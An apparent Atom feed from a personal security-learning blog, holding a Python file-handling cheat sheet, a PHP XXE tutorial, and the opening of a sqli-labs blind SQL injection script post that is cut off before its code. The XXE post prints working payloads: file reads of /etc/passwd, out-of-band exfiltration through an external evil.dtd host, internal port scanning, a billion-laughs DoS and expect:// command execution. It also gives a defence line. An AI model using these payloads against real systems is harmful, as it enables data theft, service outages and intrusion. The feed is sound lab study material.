<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kage&#39;s Blog</title>
  
  <subtitle>Kage&#39;s Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-07-20T14:07:56.251Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Kage</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python脚本-自动上传到hexo</title>
    <link href="http://yoursite.com/2019/07/20/python%E8%84%9A%E6%9C%AC-%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0%E5%88%B0hexo/"/>
    <id>http://yoursite.com/2019/07/20/python脚本-自动上传到hexo/</id>
    <published>2019-07-20T14:05:42.000Z</published>
    <updated>2019-07-20T14:07:56.251Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、压缩与解压"><a href="#一、压缩与解压" class="headerlink" title="一、压缩与解压"></a>一、压缩与解压</h2><p>导入相应模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import shutil</span><br><span class="line">import zipfile</span><br><span class="line">from os.path import join, getsize</span><br></pre></td></tr></table></figure></p><h3 id="1-python压缩指定文件夹"><a href="#1-python压缩指定文件夹" class="headerlink" title="1. python压缩指定文件夹"></a>1. python压缩指定文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def zip_file(src_dir):</span><br><span class="line">    zip_name = src_dir +&apos;.zip&apos;</span><br><span class="line">    z = zipfile.ZipFile(zip_name,&apos;w&apos;,zipfile.ZIP_DEFLATED)</span><br><span class="line">    for dirpath, dirnames, filenames in os.walk(src_dir):</span><br><span class="line">        fpath = dirpath.replace(src_dir,&apos;&apos;)</span><br><span class="line">        fpath = fpath and fpath + os.sep or &apos;&apos;</span><br><span class="line">        for filename in filenames:</span><br><span class="line">            z.write(os.path.join(dirpath, filename),fpath+filename)</span><br><span class="line">            print (&apos;==压缩成功==&apos;)</span><br><span class="line">    z.close()</span><br></pre></td></tr></table></figure><p>其中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">src_dir：你要压缩的文件夹的路径</span><br><span class="line">zip_name：压缩后zip文件的路径及名称</span><br></pre></td></tr></table></figure></p><h3 id="2-python解压zip"><a href="#2-python解压zip" class="headerlink" title="2. python解压zip"></a>2. python解压zip</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def unzip_file(zip_src, dst_dir):</span><br><span class="line">    r = zipfile.is_zipfile(zip_src)</span><br><span class="line">    if r:     </span><br><span class="line">        fz = zipfile.ZipFile(zip_src, &apos;r&apos;)</span><br><span class="line">        for file in fz.namelist():</span><br><span class="line">            fz.extract(file, dst_dir)       </span><br><span class="line">    else:</span><br><span class="line">        print(&apos;This is not zip&apos;)</span><br></pre></td></tr></table></figure><p>其中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip_src:是zip文件的全路径</span><br><span class="line"> </span><br><span class="line">dst_dir：是要解压到的目的文件夹</span><br></pre></td></tr></table></figure></p><h2 id="二、操作文件方法"><a href="#二、操作文件方法" class="headerlink" title="二、操作文件方法"></a>二、操作文件方法</h2><h3 id="1-剪切（移动）文件到指定目录"><a href="#1-剪切（移动）文件到指定目录" class="headerlink" title="1.剪切（移动）文件到指定目录"></a>1.剪切（移动）文件到指定目录</h3><p>主要通过os和shutil库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.move(filename, dst_dir)</span><br></pre></td></tr></table></figure></p><h3 id="2-删除文件夹"><a href="#2-删除文件夹" class="headerlink" title="2.删除文件夹"></a>2.删除文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.rmtree(src_dir)</span><br></pre></td></tr></table></figure><h3 id="3-删除指定文件"><a href="#3-删除指定文件" class="headerlink" title="3.删除指定文件"></a>3.删除指定文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.remove(file_src)</span><br></pre></td></tr></table></figure><h3 id="4-新建文件夹"><a href="#4-新建文件夹" class="headerlink" title="4.新建文件夹"></a>4.新建文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.mkdir(dst_dir)</span><br></pre></td></tr></table></figure><h3 id="5-遍历文件夹"><a href="#5-遍历文件夹" class="headerlink" title="5.遍历文件夹"></a>5.遍历文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for filename in os.listdir(src_dir):</span><br></pre></td></tr></table></figure><h3 id="6-复制文件"><a href="#6-复制文件" class="headerlink" title="6.复制文件"></a>6.复制文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.copyfile(src_file,dst_file)</span><br></pre></td></tr></table></figure><h2 id="三、python文件乱码问题"><a href="#三、python文件乱码问题" class="headerlink" title="三、python文件乱码问题"></a>三、python文件乱码问题</h2><h3 id="1-读文件"><a href="#1-读文件" class="headerlink" title="1.读文件"></a>1.读文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(filename,&apos;r&apos;,encoding=&apos;UTF-8&apos;) as fp:</span><br><span class="line">s = fp.read()</span><br></pre></td></tr></table></figure><h3 id="2-写文件"><a href="#2-写文件" class="headerlink" title="2.写文件"></a>2.写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;D:/hexo/source/_posts/%s&quot; % filename,&apos;w&apos;,encoding=&quot;UTF-8&quot;) as f:</span><br><span class="line">f.write(result)</span><br></pre></td></tr></table></figure><h3 id="3-注意"><a href="#3-注意" class="headerlink" title="3.注意"></a>3.注意</h3><p>记得加encoding=”UTF-8”，不然会出现乱码问题。</p><h2 id="四、获取当前时间"><a href="#四、获取当前时间" class="headerlink" title="四、获取当前时间"></a>四、获取当前时间</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、压缩与解压&quot;&gt;&lt;a href=&quot;#一、压缩与解压&quot; class=&quot;headerlink&quot; title=&quot;一、压缩与解压&quot;&gt;&lt;/a&gt;一、压缩与解压&lt;/h2&gt;&lt;p&gt;导入相应模块&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;
      
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>PHP XXE</title>
    <link href="http://yoursite.com/2019/07/20/PHP%20XXE/"/>
    <id>http://yoursite.com/2019/07/20/PHP XXE/</id>
    <published>2019-07-20T13:57:20.000Z</published>
    <updated>2019-07-20T13:57:20.765Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xml是什么"><a href="#xml是什么" class="headerlink" title="xml是什么"></a>xml是什么</h2><p>XML指可扩展标记语言<br>用处：被设计用来传输和存储数据。<br>与HTML区别：HTML是被设计用来显示数据，HTML具有特效，XML用来传输数据<br>XML 标签没有被预定义。需要自行定义标签<br>XML 被设计为具有自我描述性</p><h2 id="一个XML文档实例"><a href="#一个XML文档实例" class="headerlink" title="一个XML文档实例"></a>一个XML文档实例</h2><p>第一行是xml声明，定义版本和使用编码<br>第二行是根元素，一个xml文档必须拥有根元素<br>其下几行是子元素<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><h2 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h2><ol><li>所有XML元素都必须有关闭标签</li><li>XML标签对大小写敏感</li><li>XML必须正确嵌套</li><li>XML文档必须有根元素</li><li>XML的属性值必须加引号</li><li>有些特殊符号需要进行实体引用<br>在XML中的5个预定义实体引用<br><img src="/img/1543499945581.png" alt=""></li><li>xml也有注释与html注释一样</li><li>在xml中多个空格是会被保留的</li><li>xml可以有自闭和标签</li></ol><h2 id="XML-DTD学习"><a href="#XML-DTD学习" class="headerlink" title="XML DTD学习"></a>XML DTD学习</h2><p>DTD（文档类型定义）的作用是定义XML文档的合法构建模块。它使用一系列的合法元素来定义文档结构。<br>DTD可以被成行地声明于XML文档中，也可作为一个外部引用。</p><h2 id="内部的DOCTYPE声明"><a href="#内部的DOCTYPE声明" class="headerlink" title="内部的DOCTYPE声明"></a>内部的DOCTYPE声明</h2><p>语法声明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure></p><p>带有DTD的XML文档实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><p>以上 DTD 解释如下：<br>!DOCTYPE note (第二行)定义此文档是 note 类型的文档。</p><p>!ELEMENT note (第三行)定义 note 元素有四个元素：”to、from、heading,、body”</p><p>!ELEMENT to (第四行)定义 to 元素为 “#PCDATA” 类型</p><h2 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h2><p>假如DTD位于XML源文件的外部，那么它应通过下面的语法被封装在一个DOCTYPE定义中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure></p><h2 id="DTD构建模块"><a href="#DTD构建模块" class="headerlink" title="DTD构建模块"></a>DTD构建模块</h2><p>所有的XML文档均有以下简单的构建模块构成：</p><ul><li>元素</li><li>属性</li><li>实体</li><li>PCDATA（实体会被XML解析器所解析）</li><li>CDATA（实体不会被解析）</li></ul><h2 id="DTD属性"><a href="#DTD属性" class="headerlink" title="DTD属性"></a>DTD属性</h2><p>语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></figure></p><h2 id="DTD实体（漏洞点）"><a href="#DTD实体（漏洞点）" class="headerlink" title="DTD实体（漏洞点）"></a>DTD实体（漏洞点）</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的<strong>变量</strong>。<br>实体引用是对实体的引用。<br>实体可在内部或外部进行声明。</p><p><strong>内部实体语法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>内部实体声明例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;kage&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright bu1uokage.cn&quot;&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure></p><p><strong>外部实体语法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>外部实体引用例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>外部实体支持的协议<br><img src="/img/1543746778920.png" alt=""><br>php扩展协议<br><img src="/img/1543746812561.png" alt=""></p><p><strong>参数实体</strong><br>参数实体只能在DTD中使用。<br>语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure></p><hr><h2 id="PHP的XML解析"><a href="#PHP的XML解析" class="headerlink" title="PHP的XML解析"></a>PHP的XML解析</h2><h2 id="DOM解析"><a href="#DOM解析" class="headerlink" title="DOM解析"></a>DOM解析</h2><ol><li><p>得到面(整个文档)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$xml = new Domdocument(&apos;1.0&apos;,&apos;utf-8&apos;);</span><br><span class="line">$xml-&gt;load(&apos;xxx.xml&apos;);</span><br></pre></td></tr></table></figure></li><li><p>得到串(节点列表对象,nodelist Object)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$xml-&gt;getElementsByTagName(&apos;节点名&apos;)</span><br></pre></td></tr></table></figure></li><li><p>得到点(节点/元素)<br>$nodelist-&gt;item(0/1/2….);</p><h2 id="simpleXML解析"><a href="#simpleXML解析" class="headerlink" title="simpleXML解析"></a>simpleXML解析</h2><p>simpleXML解析XML文件非常简单，<br>因为它一次性把XML文档解析成一个大对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$simxml = simplexml_load_file(&apos;./book.xml&apos;);</span><br><span class="line">$simxml = simplexml_load_string($xml);</span><br></pre></td></tr></table></figure></li></ol><h2 id="XXE攻击"><a href="#XXE攻击" class="headerlink" title="XXE攻击"></a>XXE攻击</h2><p>XXE也就是外部实体注入漏洞，通常发生在web服务器在接收解析用户XML输入时，没有对文件内容进行过滤，禁止外部实体加载，导致造成任意文件读取、DOS、命令执行、内网端口扫描等危害。</p><h2 id="有回显的任意文件读取"><a href="#有回显的任意文件读取" class="headerlink" title="有回显的任意文件读取"></a>有回显的任意文件读取</h2><p>用于解析xml的php文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$body = file_get_contents(&quot;php://input&quot;);</span><br><span class="line">$xml = simplexml_load_string($body);</span><br><span class="line">var_dump($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>可以看到，服务器解析了我们的xml并进行回显<br><img src="/img/1543743770044.png" alt=""><br>方法一：直接通过DTD外部实体声明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;file;&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/img/1543743949519.png" alt=""><br>方法二：将DTD放在我们的服务器端，让目标web服务器加载我们的DTD文件<br>xml：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://www.silky.fun/evil.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;b;&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><p>dtd:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure></p><h2 id="无回显的任意文件读取"><a href="#无回显的任意文件读取" class="headerlink" title="无回显的任意文件读取"></a>无回显的任意文件读取</h2><p>无回显的任意文件读取需要我们自己构造一条外带OOB通道，具体就是，让目标服务器将文件内容赋值到参数实体中，再通过外部实体发送GET请求给我们的vps，我们写脚本或者通过vps日志文件就能获取信息。<br>xml内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://www.silky.fun/evil.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p><p>evil.dtd内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://www.silky.fun/evil.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p><p>发送<br><img src="/img/1543745180681.png" alt=""><br>从access.log查看回显<br><img src="/img/1543745021636.png" alt=""></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY port SYSTEM &quot;http://127.0.0.1:80&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;port;&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>我们知道80端口是开放的，这时页面会返回报错信息如下：<br><img src="/img/1543745894729.png" alt=""><br>检测3389端口是没开放的，报错如下：<br><img src="/img/1543745945842.png" alt=""></p><h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;!DOCTYPE lolz [</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> ]&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>xml命令执行需要php有expect扩展，但是默认没有，比较难利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;xxe;&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><p>刚开始测试的时候，我用的是php5.6一直不能引用外部实体，后来发现php5.5以下的才能够成功。网上很多文章都没有提到，很多直接介绍xml和xxe，所以复现起来老是失败，后来在网上找到一个回答可以参考一下</p><blockquote><p>以上测试在php5.4一下包括5.4是成功的，php5.5及以上是不成功的。可能的原因是5.5以上版本后，simplexml_load_string()、DOMDocument::loadxml()等不解析外部实体导致都不到文件还是因为libxml2版本的问题，还是高版本的php本身默认不解析外部实体呢，还是其他神恶魔原因呢？如果是因为php本身问题，那么XXE的利用范围也太过小了吧，应该不是这样的。。但是讲道理网上的资料太老了吧，估计也是参考别人的自己没有试验吧，等有空再做实验看看是什么问题。<br>今天在弄phith0n的vulhub的时候，无意间看到php-xxe的项目，得到了我想要的结果。XXE的利用跟php版本没有关系，而是xmllib的版本问题，xmllib2.9.0以后，是默认不解析外部实体的。</p></blockquote><p>还有一个坑就是，无回显直接传输内容可能会失败，用php流传输比较好。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;xml是什么&quot;&gt;&lt;a href=&quot;#xml是什么&quot; class=&quot;headerlink&quot; title=&quot;xml是什么&quot;&gt;&lt;/a&gt;xml是什么&lt;/h2&gt;&lt;p&gt;XML指可扩展标记语言&lt;br&gt;用处：被设计用来传输和存储数据。&lt;br&gt;与HTML区别：HTML是被设计用来显
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-labs 盲注脚本编写</title>
    <link href="http://yoursite.com/2019/06/13/Sqli-labs%20%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/"/>
    <id>http://yoursite.com/2019/06/13/Sqli-labs 盲注脚本编写/</id>
    <published>2019-06-12T16:54:13.000Z</published>
    <updated>2019-06-12T16:54:15.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h2><p>1.初始化<br>设置数组范围，猜英文字符通常32~127，猜表长度通常50<br>2.当low&lt;=high进入循环<br>计算mid值，需要换算成整型<br>当所猜数小于mid<br>high指针左移为mid-1<br>当所猜数大于mid<br>low指针左移位mid+1<br>当low&gt;high时<br>输出list[high]则为最终结果</p><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>1.思路<br>构造payload：所猜数&lt;mid<br>判断条件，字符串如果在html中，那么就左移位，反之右移位<br>2.编写<br>先获得数据长度值，在根据长度获取具体值<br>我是编写两个函数<br>一个函数用来二分法求值，可求长度，或单个字符<br>第二个函数用来整合获取数据，循环每位字符得到字符串</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>python进行%赋值时，需要将%转义，二次%赋值尤其注意<br>如<code>%23</code>要变成<code>%%23</code></p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 